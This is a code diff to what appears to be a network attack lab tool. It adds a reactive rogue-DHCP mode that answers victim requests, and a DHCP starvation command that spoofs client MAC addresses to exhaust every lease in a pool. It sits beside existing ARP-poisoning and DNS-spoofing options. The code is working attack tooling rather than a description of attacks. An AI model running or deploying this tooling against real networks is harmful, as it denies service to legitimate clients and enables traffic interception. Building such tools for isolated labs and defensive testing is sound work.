@@ -67,6 +67,21 @@ def parse_args() -> argparse.Namespace:
     dhcp.add_argument("--interval", type=float, default=2.0)
     dhcp.add_argument("--cycles", type=int)
     dhcp.add_argument("--no-ack", action="store_true")
+    dhcp.add_argument("--reactive", action="store_true", help="Reply to victim DHCP requests with matching transaction IDs")
+
+    starvation = subparsers.add_parser("dhcp-starvation", help="Exhaust lab DHCP leases with spoofed client identities")
+    starvation.add_argument("--interface", required=True)
+    starvation.add_argument("--server-ip")
+    starvation.add_argument("--mac-prefix")
+    starvation.add_argument("--interval", type=float, default=0.2)
+    starvation.add_argument("--cycles", type=int)
+    starvation.add_argument("--request-timeout", type=float, default=5.0)
+    starvation.add_argument("--workers", type=int, default=4)
+    starvation.add_argument("--no-release-on-exit", action="store_true", help="Leave acquired spoofed leases in dnsmasq until gateway cleanup")
+    starvation.add_argument("--rapid-pool", action="store_true", help="Rapidly request every IP in a DHCP pool instead of waiting for each ACK")
+    starvation.add_argument("--pool-start")
+    starvation.add_argument("--pool-end")
+    starvation.add_argument("--rapid-passes", type=int, default=0, help="Pool passes for rapid mode; 0 means repeat until stopped")
 
     mitm = subparsers.add_parser("mitm-dns", help="Run ARP poisoning and DNS spoofing together")
     mitm.add_argument("--interface", required=True)
@@ -304,19 +319,77 @@ def main() -> int:
                 include_ack=rogue_server.include_ack,
             )
         )
-        rogue_server.run(
-            cycles=args.cycles,
-            stop_requested=stop_event.is_set,
-            on_event=lambda event: print_json(
-                event_payload(
-                    f"rogue_dhcp_{event.message_type}",
-                    client_mac=event.client_mac,
-                    offered_ip=event.offered_ip,
-                    server_ip=event.server_ip,
-                )
-            ),
+        event_logger = lambda event: print_json(
+            event_payload(
+                f"rogue_dhcp_{event.message_type}",
+                client_mac=event.client_mac,
+                offered_ip=event.offered_ip,
+                server_ip=event.server_ip,
+            )
         )
+        if args.reactive:
+            rogue_server.serve_requests(
+                stop_requested=stop_event.is_set,
+                on_event=event_logger,
+            )
+        else:
+            rogue_server.run(
+                cycles=args.cycles,
+                stop_requested=stop_event.is_set,
+                on_event=event_logger,
+            )
         print_json(event_payload("dhcp_spoof_stopped", interface=args.interface))
+        return 0
+
+    if args.command == "dhcp-starvation":
+        stop_event = threading.Event()
+        install_stop_signal_handlers(stop_event)
+        starver = runner.build_dhcp_starvation_client(
+            server_ip=args.server_ip,
+            mac_prefix=args.mac_prefix,
+            interval=args.interval,
+            request_timeout=args.request_timeout,
+            worker_count=args.workers,
+            release_on_exit=not args.no_release_on_exit,
+        )
+        print_json(
+            event_payload(
+                "dhcp_starvation_started",
+                interface=args.interface,
+                server_ip=starver.server_ip,
+                mac_prefix=starver.mac_prefix,
+                interval=args.interval,
+                workers=starver.worker_count,
+            )
+        )
+        event_logger = lambda event: print_json(
+            event_payload(
+                f"dhcp_starvation_{event.message_type}",
+                client_mac=event.client_mac,
+                assigned_ip=event.assigned_ip,
+                server_ip=event.server_ip,
+                xid=event.xid,
+            )
+        )
+        if args.rapid_pool:
+            pool_start = args.pool_start or settings.raw.get("LAB_DHCP_RANGE_START")
+            pool_end = args.pool_end or settings.raw.get("LAB_DHCP_RANGE_END")
+            if not pool_start or not pool_end:
+                raise SystemExit("--rapid-pool needs --pool-start/--pool-end or LAB_DHCP_RANGE_START/LAB_DHCP_RANGE_END")
+            starver.run_rapid_pool(
+                pool_start=pool_start,
+                pool_end=pool_end,
+                passes=args.rapid_passes,
+                stop_requested=stop_event.is_set,
+                on_event=event_logger,
+            )
+        else:
+            starver.run(
+                cycles=args.cycles,
+                stop_requested=stop_event.is_set,
+                on_event=event_logger,
+            )
+        print_json(event_payload("dhcp_starvation_stopped", interface=args.interface))
         return 0
 
     if args.command == "mitm-dns":
